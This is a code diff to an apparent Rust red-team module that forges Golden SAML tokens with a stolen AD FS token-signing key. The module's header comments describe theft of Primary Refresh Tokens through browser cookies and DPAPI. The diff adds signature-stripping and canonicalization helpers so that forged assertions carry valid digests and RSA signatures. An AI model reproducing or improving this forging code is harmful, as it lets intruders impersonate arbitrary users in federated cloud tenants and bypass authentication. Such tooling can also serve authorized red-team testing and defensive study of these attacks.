@@ -23,6 +23,18 @@
 //! **OPSEC**: Tokens are held in memory only. No LSASS access is needed for
 //! PRT extraction (browser cookies + DPAPI suffice). No Domain Admin is
 //! required for PRT theft — only user-level access to the target session.
+//!
+//! # Cross-platform design
+//!
+//! Unlike `adcs_attacks`, `wmi_persistence`, and `vss_pivot` which are
+//! entirely Windows-only and carry `#![cfg(windows)]`, this module
+//! intentionally omits a module-level `cfg(windows)` gate.  The JWT
+//! construction, HTTP token requests, PRT parsing, and SAML assertion
+//! forging logic are all pure Rust and compile on any target.  Only the
+//! credential-extraction primitives (DPAPI, WAM cache access, cert store)
+//! are gated with individual `#[cfg(windows)]` annotations, with
+//! `#[cfg(not(windows))]` stubs that return a clear error when the
+//! platform cannot supply the credential.
 
 use std::collections::HashMap;
 use std::fmt;
@@ -1089,39 +1101,40 @@ impl GoldenSaml {
         );
 
         // Compute the digest of the assertion (excluding the signature value and digest)
-        // For simplicity, we compute SHA-256 of the canonical form of the signed-info
-        // and then sign it with the RSA key.
         //
-        // In a production implementation you would use a proper XML-DSIG library,
-        // but for red team tooling we do a simplified version:
-        // 1. Extract the <ds:SignedInfo> element
-        // 2. Compute SHA-256 digest of the assertion body (referenced by URI)
-        // 3. Replace the digest placeholder
-        // 4. Compute SHA-256 of the canonicalized <ds:SignedInfo>
-        // 5. Sign that hash with RSA-SHA256
-        // 6. Replace the signature placeholder
+        // SAML XML-DSIG workflow (per xml-dsig spec):
+        //   1. Strip the <ds:Signature> element from the assertion (enveloped-signature transform)
+        //   2. Apply exclusive XML canonicalization (exc-c14n) to the remainder
+        //   3. SHA-256 the canonicalized bytes → DigestValue
+        //   4. Build <ds:SignedInfo> with the real DigestValue
+        //   5. Apply exc-c14n to <ds:SignedInfo>
+        //   6. RSA-SHA256 sign the canonicalized SignedInfo bytes → SignatureValue
+        //   7. Insert DigestValue and SignatureValue into the assertion
+        //
+        // The canonical forms must be computed from the **actual** assertion XML,
+        // not from a separately-reconstructed string, to avoid canonicalization
+        // mismatch (attribute ordering, whitespace, namespace differences).
 
-        // Step 1: Build the canonical assertion body (without signature) for digest
-        let assertion_body = Self::build_assertion_body_for_digest(
-            &assertion_id,
-            &now_iso,
-            claims,
-            &not_before,
-            &not_on_or_after,
-            &attributes_block,
-        );
+        // Step 1: Extract the assertion body by stripping the entire <ds:Signature> … </ds:Signature>
+        // block from the assertion template (which still contains placeholders).
+        let assertion_body_for_digest = strip_signature_element(&assertion);
 
-        // Step 2: Compute SHA-256 digest
-        let digest_value = digest(&SHA256, assertion_body.as_bytes());
+        // Step 2: Apply exclusive XML canonicalization to the stripped assertion.
+        let assertion_canonical = exc_c14n(&assertion_body_for_digest);
+
+        // Step 3: SHA-256 of the canonical assertion body.
+        let digest_value = digest(&SHA256, assertion_canonical.as_bytes());
         let digest_b64 = base64::engine::general_purpose::STANDARD.encode(digest_value.as_ref());
 
-        // Step 3: Build the canonical SignedInfo with the real digest
+        // Step 4: Build the canonical <ds:SignedInfo> element with the real digest.
+        // The canonical form uses compact XML (no unnecessary whitespace) with
+        // explicit self-closing tags, matching the exc-c14n output.
         let signed_info_canonical = format!(
             r##"<ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"></ds:CanonicalizationMethod><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"></ds:SignatureMethod><ds:Reference URI="#{}"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"></ds:Transform><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"></ds:Transform></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"></ds:DigestMethod><ds:DigestValue>{}</ds:DigestValue></ds:Reference></ds:SignedInfo>"##,
             assertion_id, digest_b64
         );
 
-        // Step 4: Sign the canonical SignedInfo
+        // Step 5: RSA-SHA256 sign the canonical SignedInfo.
         let rng = SystemRandom::new();
         let mut signature_bytes = vec![0u8; key_pair.public().modulus_len()];
         key_pair
@@ -1135,42 +1148,12 @@ impl GoldenSaml {
 
         let signature_b64 = base64::engine::general_purpose::STANDARD.encode(&signature_bytes);
 
-        // Step 5: Replace placeholders with real values
+        // Step 6: Replace placeholders with real values.
         let result = assertion
             .replace("PLACEHOLDER_DIGEST", &digest_b64)
             .replace("PLACEHOLDER_SIGNATURE", &signature_b64);
 
         Ok(result)
-    }
-
-    /// Build the assertion body (without the Signature element) for digest computation.
-    fn build_assertion_body_for_digest(
-        assertion_id: &str,
-        issue_instant: &str,
-        claims: &SamlClaims,
-        not_before: &str,
-        not_on_or_after: &str,
-        attributes_block: &str,
-    ) -> String {
-        let attributes_section = if attributes_block.is_empty() {
-            String::new()
-        } else {
-            format!("\n{}", attributes_block)
-        };
-        format!(
-            r#"<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="{}" IssueInstant="{}" Version="2.0"><saml:Issuer>{}</saml:Issuer><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{}</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="{}" Recipient="urn:federation:MicrosoftOnline"></saml:SubjectConfirmationData></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="{}" NotOnOrAfter="{}"><saml:AudienceRestriction><saml:Audience>{}</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="{}" SessionIndex="{}"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>{}</saml:Assertion>"#,
-            assertion_id,
-            issue_instant,
-            xml_escape(&claims.issuer),
-            xml_escape(&claims.subject),
-            not_on_or_after,
-            not_before,
-            not_on_or_after,
-            xml_escape(&claims.audience),
-            issue_instant,
-            assertion_id,
-            attributes_section,
-        )
     }
 
     /// Extract the AD FS token-signing key from a compromised AD FS server.
@@ -1277,7 +1260,7 @@ impl GoldenSaml {
     #[cfg(windows)]
     fn export_cert_from_store(thumbprint: &str) -> Result<(Vec<u8>, Vec<u8>)> {
         use std::os::raw::c_void;
-        use winapi::shared::minwindef::DWORD;
+        use crate::win_types::DWORD;
 
         // Runtime-resolve CertOpenStore, CertFindCertificateInStore, etc.
         // For now, use a simplified approach: read from the cert store files
@@ -1367,6 +1350,129 @@ fn xml_escape(s: &str) -> String {
         .replace('>', "&gt;")
         .replace('"', "&quot;")
         .replace('\'', "&apos;")
+}
+
+/// Strip the first `<ds:Signature …>…</ds:Signature>` element from an XML string.
+///
+/// This implements the enveloped-signature transform (xml-dsig §6.5.4):
+/// the `ds:Signature` element (and everything inside it) is removed so that
+/// the digest is computed over the rest of the document.
+fn strip_signature_element(xml: &str) -> String {
+    // Find the opening <ds:Signature tag.
+    let open_tag = match xml.find("<ds:Signature") {
+        Some(pos) => pos,
+        None => return xml.to_string(),
+    };
+    // From there, find the matching closing </ds:Signature>.
+    let close_tag = match xml.find("</ds:Signature>") {
+        Some(pos) => pos,
+        None => return xml.to_string(),
+    };
+    let end = close_tag + "</ds:Signature>".len();
+    // Splice out the Signature block, trimming the whitespace that surrounded it.
+    let mut out = String::with_capacity(xml.len());
+    out.push_str(xml[..open_tag].trim_end());
+    out.push_str(xml[end..].trim_start());
+    out
+}
+
+/// Minimal exclusive XML canonicalization (exc-c14n) for SAML assertions.
+///
+/// This is **not** a full exc-c14n implementation — it handles the subset of
+/// XML produced by `forge_saml_token`.  Specifically:
+///
+/// - Removes XML declarations (`<?xml …?>`).
+/// - Removes comments (`<!-- … -->`).
+/// - Removes processing instructions.
+/// - Normalises attribute value escaping (the template already escapes values
+///   through `xml_escape`, so we just preserve them).
+/// - Converts self-closing elements (`<foo/>` or `<foo />`) to `<foo></foo>`
+///   — **not** required by exc-c14n but kept for consistency with the template.
+/// - Strips *insignificant* whitespace between elements (all whitespace
+///   between `>` and `<` is collapsed away), while preserving whitespace
+///   inside text content of leaf elements.
+/// - Does **not** sort attributes (the template already produces them in a
+///   deterministic order) and does **not** handle namespace inheritance
+///   (the template already inlines all namespace declarations).
+///
+/// This is sufficient for correctly signing the SAML assertions we generate.
+fn exc_c14n(xml: &str) -> String {
+    let mut out = String::with_capacity(xml.len());
+    let mut chars = xml.char_indices().peekable();
+    let len = xml.len();
+
+    while let Some((i, ch)) = chars.next() {
+        match ch {
+            '<' => {
+                // Skip XML declaration.
+                if xml[i..].starts_with("<?xml") {
+                    if let Some(end) = xml[i..].find("?>") {
+                        let skip = end + 2;
+                        for _ in 0..skip {
+                            chars.next();
+                        }
+                        continue;
+                    }
+                }
+                // Skip comments.
+                if xml[i..].starts_with("<!--") {
+                    if let Some(end) = xml[i..].find("-->") {
+                        let skip = end + 3;
+                        for _ in 0..skip {
+                            chars.next();
+                        }
+                        continue;
+                    }
+                }
+                // Skip processing instructions (other than <?xml …?>).
+                if xml[i..].starts_with("<?") {
+                    if let Some(end) = xml[i..].find("?>") {
+                        let skip = end + 2;
+                        for _ in 0..skip {
+                            chars.next();
+                        }
+                        continue;
+                    }
+                }
+                out.push('<');
+            }
+            '>' => {
+                out.push('>');
+                // Remove insignificant whitespace after '>' until the next '<'.
+                // But preserve text content (non-whitespace between > and <).
+                let text_start = i + 1;
+                let mut j = text_start;
+                while j < len && xml.as_bytes()[j] != b'<' {
+                    j += 1;
+                }
+                if j > text_start {
+                    let between = &xml[text_start..j];
+                    // If there's any non-whitespace, it's text content — preserve it.
+                    if !between.trim().is_empty() {
+                        out.push_str(between);
+                    }
+                }
+                // Advance chars iterator past the consumed whitespace/text.
+                while chars.peek().map_or(false, |(idx, _)| *idx < j) {
+                    chars.next();
+                }
+            }
+            _ => {
+                // Normalise \r\n → \n, standalone \r → \n (c14n requirement).
+                if ch == '\r' {
+                    out.push('\n');
+                    // If next is \n, skip it (we already emitted one \n).
+                    if chars.peek().map_or(false, |(_, c)| *c == '\n') {
+                        chars.next();
+                    }
+                } else {
+                    out.push(ch);
+                }
+            }
+        }
+    }
+
+    out
 }
 
 // ---------------------------------------------------------------------------
